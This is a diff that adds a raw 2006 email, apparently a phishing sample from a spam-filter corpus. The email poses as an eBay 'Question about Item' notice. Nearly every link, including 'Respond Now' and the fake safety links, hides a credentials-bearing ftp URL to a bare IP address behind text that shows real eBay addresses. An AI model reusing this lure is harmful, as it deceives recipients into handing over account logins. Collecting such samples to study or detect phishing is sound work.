@@ -1,0 +1,266 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <www-data@hyde.hardwareluxx.de>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (unknown [152.160.49.220])
+ by example.com (Postfix) with ESMTP id C9BB2468ED
+ for <user@login.example.com>; Sat, 14 Oct 2006 09:31:03 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.example.org (Postfix) with ESMTP id DBFC2131F889
+ for <user@example.com>; Sat, 14 Oct 2006 09:31:03 -0400 (EDT)
+X-Spam-Flag: YES
+X-Spam-Score: 8.485
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.485 tagged_above=-100 required=4
+ tests=[BAYES_50=0.001, DCC_CHECK=4, HTML_MESSAGE=0.001,
+ HTML_MIME_NO_HTML_TAG=1.082, MIME_HTML_ONLY=0.001, REPLY_TO_EMPTY=0.6,
+ URIBL_PH_SURBL=2.8]
+Received: from mail.example.org ([127.0.0.1])
+ by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id TxoaYtc+di5P for <user@example.com>;
+ Sat, 14 Oct 2006 09:31:02 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP
+ for <user@example.com>; Sat, 14 Oct 2006 09:31:02 -0400 (EDT)
+Received: from hyde.hardwareluxx.de (hyde.hardwareluxx.de [83.246.70.196])
+ by mail.example.org (Postfix) with ESMTP id A1EE36FA354
+ for <user@example.com>; Sat, 14 Oct 2006 09:30:43 -0400 (EDT)
+Received: from www-data by hyde.hardwareluxx.de with local (Exim 4.50)
+ id 1GYjb2-0005aE-BK
+ for user@example.com; Sat, 14 Oct 2006 15:30:36 +0200
+To: user@example.com
+Subject: Message from eBay Member
+From: eBay <message@ebay.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1GYjb2-0005aE-BK@hyde.hardwareluxx.de>
+Date: Sat, 14 Oct 2006 15:30:36 +0200
+X-SA-Exim-Connect-IP: <locally generated>
+X-SA-Exim-Mail-From: www-data@hyde.hardwareluxx.de
+X-SA-Exim-Scanned: No (on hyde.hardwareluxx.de);
+ SAEximRunCond expanded to false
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 422
+
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 xmlns:x="urn:schemas-microsoft-com:xslt">
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Verdana, sans-serif" color=#666666 size=1><B>eBay sent this message to you</B><BR>Your registered name is included to show this message originated from eBay. <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>Learn more</FONT></A>. </FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=white border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG src="http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/hdrLeft_13x39.gif"></TD>
+<TD noWrap width="98%" background=http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/imgSpan_5x39.gif><SPAN class=SectionTitle><FONT size=4><B>Question about Item -- Respond Now</B></FONT></SPAN></TD>
+<TD vAlign=bottom noWrap width="1%"><IMG alt=eBay src="http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/hdrRight_90x39.gif"></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #9999cc 1px solid; BORDER-LEFT: #9999cc 1px solid; BORDER-BOTTOM: #9999cc 1px solid" width="100%" bgColor=#eeeef8 border=0>
+<TBODY>
+<TR>
+<TD style="PADDING-LEFT: 8px" height=30><FONT face="Arial, Verdana" size=2>eBay sent this message on behalf of an eBay member via My Messages. Responses sent using email will go to the eBay member directly and will include your email address. Click the <B>Respond Now</B> button below to send your response via My Messages (your email address will not be included).</FONT> </TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD>
+<TD vAlign=top>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD vAlign=top>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=1 width="100%" align=center bgColor=#9999cc border=0>
+<TBODY>
+<TR bgColor=#9999cc height=26>
+<TD><FONT color=#ffffff>&nbsp;<SPAN class=SectionTitle>Question from <a href="http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&amp;userid=nanabargainhouse&amp;iid=5879770966&amp;frm=284">nanabargainhouse</a><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /> ( <a href="http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&amp;userid=nanabargainhouse">405</a><img title="Feedback score is 5,000 to 9,999" height="25" alt="Feedback score is 5,000 to 9,999" src="http://pics.ebaystatic.com/aw/pics/icon/iconGreenStar_25x25.gif" width="25" align="absmiddle" border="0" />) <img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /><a href="http://pages.ebay.com/services/buyandsell/powersellers.html"><img height="25" alt="Member is a PowerSeller" src="http://pics.ebaystatic.com/aw/pics/icon/psIcon_50x25.gif" width="50" align="absmiddle" border="0" /></a><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /><a href="htt
+ p://members.ebay.com/ws/eBayISAPI.dll?ViewUserPage&amp;userid=nanabargainhouse"><img title="About Me" height="8" alt="About Me" src="http://pics.ebaystatic.com/aw/pics//aboutme-small.gif" width="23" align="absmiddle" border="0" /></a><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /></SPAN></FONT></TD>
+</TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+<TBODY>
+<TR bgColor=#eeeeee>
+<TD>
+<TABLE cellSpacing=4 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>Item: (<A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank>5879770966</A>)</FONT></TD>
+</TR>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>This message was sent while the listing was <B>active</B>.</FONT></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2><a href="http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&amp;userid=nanabargainhouse&amp;iid=5879736153&amp;frm=284">nanabargainhouse</a><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /> (  <a href="http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&amp;userid=nanabargainhouse">405</a><img title="Feedback score is 50 to 99" height="25" alt="Feedback score is 50 to 99" src="http://pics.ebaystatic.com/aw/pics/icon/iconBlueStar_25x25.gif" width="25" align="absmiddle" border="0" />) <img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="4" border="0" /> he <B>is a potential buyer</B>.</FONT></TD>
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR bgColor=#c6c6c6>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR bgColor=#ffffff>
+<TD>
+<TABLE cellSpacing=0 cellPadding=4>
+<TBODY>
+<TR>
+<TD vAlign=top width="75%"><p>
+Hello, i really need some info on your item so please tell me you have a fixed price on it? i will be able to pay an extra 30$ above your price just to be in possesion of this item,i truly hope that you will answer me as soon as you receive this email.regards</p>  <FONT face="Arial, Verdana" size=2><BR></FONT></TD>
+<TD vAlign=top align=middle width="22%">
+<TABLE borderColor=#999999 cellSpacing=0 cellPadding=0 width="100%" bgColor=#eeeef8 border=1>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=3 cellPadding=3 width="100%">
+<TBODY>
+<TR>
+<TD align=middle><FONT face="Arial, Verdana" size=2><B>Respond to this question in My Messages.</B></FONT> </TD></TR>
+<TR>
+<TD align=middle><A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><IMG alt="Respond Now" src="http://pics.ebaystatic.com/aw/pics/uk/email/message/btnRespondNow.gif" border=0></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD width="3%"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=15 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR bgColor=#9c9c9c>
+<TD colSpan=3><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></TD></TR>
+<TR bgColor=#d6deff height=22>
+<TD align=left width="1%"><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=16 border=0></TD>
+<TD align=left><FONT face="Arial, Verdana" size=2><B>Item Details</B></FONT> </TD></TR>
+<TR bgColor=#ffffff>
+<TD colSpan=3><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></TD></TR>
+<TR bgColor=#fed73b>
+<TD colSpan=3><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></TD></TR></TBODY></TABLE>
+<TABLE style="BORDER-RIGHT: #d6dcfe 1px solid; BORDER-TOP: #d6dcfe 1px solid; BORDER-LEFT: #d6dcfe 1px solid; BORDER-BOTTOM: #d6dcfe 1px solid" cellSpacing=0 cellPadding=0 width="100%" bgColor=white>
+<TBODY>
+<TR>
+<TD width="100%">
+<TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><FONT face="Arial, Verdana" size=2></FONT></TD>
+<TD></TD></TR>
+<TR bgColor=#f4f4f4>
+<TD noWrap width="1%"><FONT face="Arial, Verdana" size=2>Item number: </FONT></TD>
+<TD><font face="Arial, Verdana" size="2"><a href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target="_blank">5879770966</a></font></TD>
+</TR>
+<TR>
+<TD noWrap width="1%"><FONT face="Arial, Verdana" size=2>End date: </FONT></TD>
+<TD><FONT face="Arial, Verdana" size=2>10 - octomber - 06&nbsp;01:17:39 BST</FONT> </TD>
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>View item description:</FONT></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#003399 size=2><A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank>htps://cgi.ebay.com/ws/eBayISAPI.dll?ViewItem&amp;item=4615976000&amp;sspagename=ADME:B:AAQ:UK:1</A></FONT></TD>
+</TR>
+<TR>
+<TD><FONT color=#003399><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></FONT></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>Thank you for using eBay</FONT></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#003399 size=2><A href="http://www.ebay.com/" target=_blank>http://www.ebay.com/</A></FONT></TD>
+</TR>
+<TR>
+<TD><FONT color=#003399><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD vAlign=top width=10><FONT color=#003399><IMG src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></FONT></TD>
+<TD vAlign=top align=right width=188>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #6b7b91 1px solid; BORDER-TOP: #6b7b91 1px solid; BORDER-LEFT: #6b7b91 1px solid; BORDER-BOTTOM: #6b7b91 1px solid" cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD bgColor=#cad2dd><FONT color=#003399><IMG height=25 alt="Marketplace Safety Tip" src="http://pics.ebaystatic.com/aw/pics/uk/securityCenter/imgShield_25x25.gif" width=25 border=0></FONT></TD>
+<TD noWrap bgColor=#cad2dd><FONT face="Arial, Helvetica, Verdana, sans-serif" size=-1><B><A style="COLOR: #000000; TEXT-DECORATION: none" href="http://pages.ebay.co.uk/safetycentre" target=_blank>Marketplace Safety Tip</A></B></FONT> </TD>
+<TD bgColor=#cad2dd><IMG title="" height=25 alt=" " src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif" width=25 border=0></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2><B>Always remember to complete your transactions on eBay - it's the safer way to trade.</B><BR><BR>Is this message an offer to buy your item directly through email without winning the item on eBay? If so, please help make the eBay marketplace safer by reporting it to us. These external transactions may be unsafe and are against eBay policy. <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>Learn more about trading safely</FONT></A>. </FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=#c9d2dc height=5><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #c6c6c6 1px solid; BORDER-TOP: #c6c6c6 1px solid; BORDER-LEFT: #c6c6c6 1px solid; BORDER-BOTTOM: #c6c6c6 1px solid" cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>Is this email inappropriate? Does it breach <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>reporting it</FONT></A>. </FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD colSpan=3><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+<TBODY>
+<TR>
+<TD height=1></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>Learn how you can protect yourself from spoof (fake) emails at:<BR>
+<A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>https://pages.ebay.com/education/spooftutorial</FONT></A> </FONT></TD>
+</TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>This eBay notice was sent to you on behalf of another eBay member through the eBay platform and in accordance with our Privacy Policy. If you would like to receive this email in text format, change your <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>notification preferences</FONT></A>. </FONT></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies.<BR>
+Privacy Policy: <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>https://pages.ebay.com/help/policies/privacy-policy.html</FONT></A><BR>
+User Agreement: <A href="ftp://ebaycomdll:signinebay@205.134.160.10/signin.ebay.com,i&pa1=&i1=&bshowgif=&UsingSSL=&ru=&emigrateVisitor.htm" target=_blank><FONT color=#003399>https://pages.ebay.com/help/policies/user-agreement.html</FONT></A> </FONT></TD>
+</TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>Copyright ©&nbsp;2006 eBay, Inc. All Rights Reserved.<BR>
+    Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+
+
